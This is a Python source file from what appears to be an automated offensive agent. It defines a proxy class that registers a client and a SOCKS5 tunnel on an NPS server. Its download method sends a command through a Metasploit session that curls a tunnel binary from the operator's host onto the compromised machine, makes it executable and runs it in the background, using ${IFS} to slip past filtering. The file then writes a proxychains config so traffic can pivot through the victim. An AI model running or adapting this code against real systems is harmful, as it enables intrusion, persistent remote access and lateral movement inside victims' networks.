import requests
import time
import hashlib
import os 
from dotenv import load_dotenv
from scriptkidagent.tools.tools import execute_in_msfconsole, execute_in_bash
load_dotenv()


class Proxy:
    def __init__(self, ip, port, process):
        self.nps_host = os.getenv("nps_host")
        self.nps_server = f"http://{self.nps_host}:8080"
        self.ip = ip
        self.proxy_port = port
        self.auth_key = os.getenv("auth_key")
        self.vkey = ""
        self.process = process
        self.proxychain_config_dir = os.path.expanduser("~/.proxychains/")
        self.proxychain_config_file = self.proxychain_config_dir+f"proxy_{self.ip.replace(".", "_")}.config"

    def get_key(self):
        timestamp = str(int(time.time()))
        auth_key = hashlib.md5((self.auth_key+timestamp).encode()).hexdigest()
        return auth_key, timestamp
    
    def add_client(self):
        auth_key, timestamp = self.get_key()
        uri = "/client/add"
        data = {
            "auth_key": auth_key,
            "timestamp": timestamp,
            "remark": self.ip,
            "config_conn_allow": 1,
            "compress": 0,
            "crypt": 0
        }
        response = requests.post(f"{self.nps_server}{uri}", data=data)
        print(response.text)
    
    def get_client(self):
        auth_key, timestamp = self.get_key()
        uri = "/client/list"
        data = {
            "auth_key": auth_key,
            "timestamp": timestamp,
            "search": self.ip,
            "start": 0,
            "limit": 200
        }
        response = requests.post(f"{self.nps_server}{uri}", data=data)
        return response.json()

    def add_socks5(self):
        auth_key, timestamp = self.get_key()
        uri = "/proxy/add"
        data = {
            "auth_key": auth_key,
            "timestamp": timestamp,
            "remark": self.ip,
            "type": "socks5",
            "client_id": self.id,
            "port" : self.proxy_port
        }
        response = requests.post(f"{self.nps_server}{uri}", data=data)
        

    def get_proxy(self):
        auth_key, timestamp = self.get_key()
        uri = "/index/gettunnel"
        data = {
            "auth_key": auth_key,
            "timestamp": timestamp,
            "type": "socks5",
            "offset": 0,
            "limit": 100
        }
        response = requests.post(f"{self.nps_server}{uri}", data=data)
        return response.json()
        
    def setup(self):
        self.add_client()
        client = self.get_client()
        self.vkey = client.get('rows')[0].get('VerifyKey')
        self.id = client.get('rows')[0].get('Id')
        self.add_socks5()
        self.download_npc_client_and_exec()
        self.setup_proxychains()

    def download_npc_client_and_exec(self):
        url = f"http://{self.nps_host}/npc"
        
        command =f"execute -f '/bin/bash${IFS}-c \"curl -o /tmp/npc {url}; chmod +x /tmp/npc; /tmp/npc -server={self.nps_host}:8024 -vkey={self.vkey} &\"'"
        execute_in_msfconsole(command)

    def setup_proxychains(self):
        if not os.path.exists(self.proxychain_config_dir):
            os.makedirs(self.proxychain_config_dir)
        with open(self.proxychain_config_file, "a") as f:
            line = f"socks5 {self.ip} {self.proxy_port}"
            f.write(line)
        print(f"Proxychains config file is saved to {self.proxychain_config_file}")

